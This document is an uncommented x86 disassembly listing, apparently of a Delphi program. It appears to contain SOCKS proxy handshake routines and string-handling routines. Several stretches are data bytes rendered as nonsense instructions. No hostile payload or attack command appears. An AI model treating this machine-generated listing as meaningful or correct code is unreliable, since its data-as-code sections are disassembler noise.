mov eax esi
call sub_40850c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x14 ]
call sub_40416c
sub_478fc8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x14 ]
mov edx esi
call sub_40416c
mov eax esi
call sub_4043d8
test eax eax
jle r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax esi
call sub_408684
mov [ ebx + 0xc ] eax
sub_478ff4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_479019
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479020
retn
sub_4792e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_475220
mov [ esi + 0x68 ] 0x0
mov [ esi + 0x7c ] 0x0
mov [ esi + 0x74 ] 0x438
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_479324
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x114 ] ebx
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_47952d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x110 ] 0x4
mov [ ebp - 0x10f ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10e ] ax
cmp [ esi + 0x7c ] 0x2
jne r-xdata
lea ecx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_471e00
mov edx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4723b8
mov [ ebp - 0x10c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_4723b8
mov [ ebp - 0x10c ] eax
jmp r-xdata
add ebx 0x9
lea edx [ ebp - 0x110 ]
mov ecx ebx
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
lea edx [ ebp - 0x8 ]
mov ecx 0x8
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
mov al [ ebp - 0x7 ]
sub al 0x5a
je r-xdata
mov eax edi
call sub_4043d8
push eax
mov eax edi
call sub_4045d8
lea edx [ ebp + ebx - 0x106 ]
pop ecx
call sub_4028e8
mov eax edi
call sub_4043d8
inc ebx
add eax ebx
mov ebx eax
mov [ ebp + ebx - 0x107 ] 0x0
lea eax [ ebp - 0x108 ]
mov edx [ esi + 0x78 ]
mov ecx 0xff
call sub_4043b4
xor ebx ebx
mov bl [ ebp - 0x108 ]
mov [ ebp + ebx - 0x107 ] 0x0
cmp [ esi + 0x7c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479534
lea eax [ ebp - 0x124 ]
mov edx 0x5
call sub_40413c
retn
dec al
je r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x11c ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x11c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x124 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x124 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
sub_47954c
push ebp
mov ebp esp
push ecx
mov ecx 0x29
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_479b1f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov [ ebp - 0x10e ] 0x2
mov [ ebp - 0x10e ] 0x0
jmp r-xdata
mov al [ ebp - 0x10f ]
cmp al [ ebp - 0xd ]
jne r-xdata
mov al [ ebp - 0x10e ]
mov [ ebp - 0xd ] al
mov [ ebp - 0x110 ] 0x5
mov al 0x1
mov [ ebp - 0x10f ] al
and eax 0xff
add eax 0x2
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_403910#6
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
cmp al 0xff
jne r-xdata
mov [ ebp - 0x110 ] 0x5
mov [ ebp - 0x10f ] 0x1
mov [ ebp - 0x10e ] 0x0
mov [ ebp - 0x10d ] 0x3
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov [ ebp - 0x10c ] al
mov esi 0x5
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
jle r-xdata
mov [ ebp - 0x110 ] 0x1
mov eax [ ebx + 0x78 ]
call sub_4043d8
mov [ ebp - 0x10f ] al
mov esi 0x2
mov eax [ ebx + 0x78 ]
call sub_4043d8
test eax eax
jle r-xdata
cmp [ ebx + 0x68 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043d8
add esi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10 ] ax
lea edx [ ebp + esi - 0x110 ]
lea eax [ ebp - 0x10 ]
mov ecx 0x2
call sub_4028e8
add esi 0x2
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor eax eax
push ebp
push j_sub_4037e4#6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x5
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043d8
push eax
mov eax [ ebp - 0x4 ]
call sub_4045d8
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e8
mov eax [ ebx + 0x78 ]
call sub_4043d8
add esi eax
mov eax [ ebx + 0x70 ]
call sub_4043d8
mov [ ebp + esi - 0x110 ] al
inc esi
mov eax [ ebx + 0x70 ]
call sub_4043d8
test eax eax
jle r-xdata
mov eax [ ebx + 0x78 ]
call sub_4043d8
push eax
mov eax [ ebx + 0x78 ]
call sub_4045d8
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e8
xor eax eax
mov al [ ebp - 0x10f ]
cmp eax 0x8
ja r-xdata
mov eax [ ebx + 0x70 ]
call sub_4043d8
add esi eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_403910#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x70 ]
call sub_4043d8
push eax
mov eax [ ebx + 0x70 ]
call sub_4045d8
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e8
lea edx [ ebp - 0x148 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x148 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp [ eax * 4 + r-xdata ]
cmp [ ebp - 0x10f ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
xor eax eax
push ebp
push j_sub_4037e4#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479b26
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_40413c
retn
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_479b30
push ebx
mov bl [ eax + 0x7c ]
dec ebx
sub bl 0x2
jb r-xdata
call sub_479324
pop ebx
retn
je r-xdata
call sub_47954c
jmp r-xdata
pop ebx
retn
sub_479b4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_479b71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479b78
retn
sub_479b88
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
fwait
inc edi
add [ eax ] cl
add [ eax ] al
add al ch
push 0x41
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] ch
mov ch 0x41
add [ ebp + esi * 4 + 0x41 ] dh
add [ ebp + esi * 4 - 0x63c7ffbf ] cl
inc edi
add [ eax - 0x64 ] dl
inc edi
add [ esp + ebx * 4 + 0x47 ] cl
add [ eax + 0xc0041b6 ] dh
push esp
dec ecx
push esp
inc ebx
push eax
push ebx
je r-xdata
rcl [ ebp + 0x68 ] 0x89
pushfd
inc edi
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479c90
retn
popad
insd
lea eax [ eax ]
sub_479bfc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_479c64
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_479c89
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479c90
retn
sub_479cf8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ ecx ]
xor eax eax
jmp r-xdata
cmp eax [ ecx ]
jl r-xdata
mov bl [ edx + eax ]
sub bl 0xa
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov esi eax
mov [ edi ] 0x1
inc eax
mov [ ecx ] eax
jmp r-xdata
sub bl 0x3
je r-xdata
mov esi eax
mov [ edi ] 0x1
inc eax
cmp eax [ ecx ]
jge r-xdata
jmp r-xdata
mov [ ecx ] eax
jmp r-xdata
cmp [ edx + eax ] 0xa
jne r-xdata
inc eax
inc eax
mov [ ecx ] eax
jmp r-xdata
sub_479d48
push ebp
mov ebp esp
add esp 0xfffff6d4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x81c ] ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_479f1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebx ]
call sub_403530
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
or ecx 0xffffffff
mov edx r-xdata
mov ebx [ eax ]
call [ ebx + 0x70 ]
jmp r-xdata
mov [ ebp - 0x15 ] 0x0
mov eax [ ebp + 0x8 ]
call sub_404118
mov cx 0x1
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov esi eax
mov cx 0x2
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov [ ebp - 0x14 ] eax
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebp - 0x14 ]
sub eax esi
test eax eax
jle r-xdata
mov [ ebp - 0x4 ] 0x7fffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479f23
lea eax [ ebp - 0x81c ]
call sub_404118
retn
cmp [ ebp - 0x5 ] 0x0
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x81c ]
push eax
lea edx [ ebp - 0x92c ]
mov eax [ ebx ]
call sub_40326c
lea eax [ ebp - 0x92c ]
mov [ ebp - 0x82c ] eax
mov [ ebp - 0x828 ] 0x4
mov [ ebp - 0x824 ] esi
mov [ ebp - 0x820 ] 0x0
lea edx [ ebp - 0x82c ]
mov ecx 0x1
mov eax r-xdata
call sub_409280
mov ecx [ ebp - 0x81c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
cmp esi [ ebp - 0x14 ]
jge r-xdata
mov eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41b514
jmp r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
sub eax esi
mov edx 0x800
call sub_473bf4
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x816 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_41b720
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x816 ]
mov eax [ ebx ]
call sub_479cf8
mov edi eax
add esi [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_4043d8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax edi
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
add edx edi
mov eax [ ebp + 0x8 ]
call sub_404764
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_4045d8
mov edx [ ebp - 0x10 ]
lea edx [ eax + edx ]
lea eax [ ebp - 0x816 ]
mov ecx edi
call sub_4028e8
mov edi [ ebp - 0x4 ]
sub edi [ ebp - 0x10 ]
mov [ ebp - 0x15 ] 0x1
sub esi [ ebp - 0xc ]
add esi edi
sub_479f58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4043d8
test eax eax
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
mov ecx eax
mov eax ebx
call sub_41b758
sub_479f78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_479fc0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx esi
call sub_404424
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_479f58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479fc7
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_479fcf
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
xor eax eax
push ebp
push sub_479ffd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a004
retn
sub_47a014
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ eax + 0x47 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x740047a0
add [ eax ] al
add [ eax ] al
mov [ edi ] eax
in al dx
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edi + 0x47 ] dl
add al bl
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
add [ ebx ] 0x0
or [ ebx + 0x6f ] edx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffb859 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ ebp + 0x47 ] cl
add [ eax ] al
push esp
inc edi
add [ eax ] bh
push esp
inc edi
add [ eax + 0x54 ] ch
inc edi
add [ edx + ecx * 4 ] bl
inc edi
add ah al
mov eax [ 0xffffffffa3540047 ]
inc edi
add [ eax ] bh
movsd [ edi ] [ esi ]
inc edi
add [ eax - 0x47ffb85b ] cl
movsd [ edi ] [ esi ]
inc edi
add ah al
movsd [ edi ] [ esi ]
inc edi
add [ esi + 0x47 ] al
add [ edx ] dl
push esp
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
fcom [ ebx + 0x1df40041 ]
inc edx
add ah dh
xchg edx eax
shl [ eax + 0x12070047 ] 0x1
push esp
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al 0x0
or [ ebp + 0x73 ] dl
dec esi
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_4219a8
mov eax [ r-xdata ]
call sub_474eac
test al al
je r-xdata
popad
nop
push ebx
mov ebx eax
mov eax ebx
call sub_4789e4
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
push ebp
jae r-xdata
mov al [ 0xffffffff89b80047 ]
inc edi
add [ 0x64491100 ] al
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_473bf4
mov edi eax
jmp r-xdata
pop ebx
retn
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x20 ]
add [ eax + edx + r-xdata ] dl
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x68 ] si
jb r-xdata
popad
insb
lea eax [ eax ]
cwde
mov eax [ 0x47 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x47a1 ]
dec esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x480047a1 ] dh
add [ eax ] al
add [ edx + esi * 2 ] bl
inc ecx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x17 ] bh
inc edx
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax ] dl
pop ss
inc edx
add [ eax + ebx ] ch
inc edx
add al al
cmpsd [ esi ] [ edi ]
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x47a1 ] ah
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsw
add [ eax ] dl
inc eax
add [ eax + eax ] ch
[ eax + eax ]
xchg ecx eax
inc edi
add [ edi ] ch
inc edi
add ah al
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53090003 ] al
outsd
add [ ecx + edx * 4 - 0x58d3ffb9 ] cl
mov eax esi
call sub_47487c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_47487c
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4219d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_4219d8
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4043d8
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_474e68
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a330
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_47a1e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47a346
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi 0xfffffffe
sete bl
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_421640
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47a329
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_4219a8
mov eax [ r-xdata ]
call sub_474eac
test al al
je r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_473bf4
mov edi eax
jmp r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
mov eax esi
call sub_47487c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_47487c
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4219d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_4219d8
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4043d8
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_474e68
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a330
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_47a354
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_47a525
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47a72c
mov al [ eax + 0x7c ]
dec eax
sub al 0x3
jae r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4041b0
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47a72c
mov edx [ eax + 0x6c ]
lea eax [ ebp - 0x10 ]
call sub_4041b0
mov eax [ ebp - 0x4 ]
call sub_47a72c
mov edi [ eax + 0x74 ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_471e00
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx edi
call sub_475af0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_475344
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4789e8
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_475844
lea eax [ ebx + 0x14 ]
mov edx [ ebp + 0x18 ]
call sub_40416c
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x24 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x28 ] eax
mov eax ebx
call sub_4759d0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_4722ac
test al al
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_475344
cmp esi 0xffffffff
je r-xdata
mov eax [ rw-data ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx 0x1
mov edx 0x6
call sub_475964
mov eax [ r-xdata ]
call sub_474eac
test al al
je r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_471cb4
jmp r-xdata
push ebp
mov eax 0x1d4c0
call sub_47a1e0
pop ecx
jmp r-xdata
push ebp
mov eax esi
call sub_47a1e0
pop ecx
mov eax [ ebp - 0x4 ]
call sub_47a72c
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_479b30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a52c
lea eax [ ebp - 0x1c ]
call sub_404118
lea eax [ ebp - 0x10 ]
call sub_404118
retn
sub_47a54c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_475220
mov [ esi + 0x6c ] 0x1
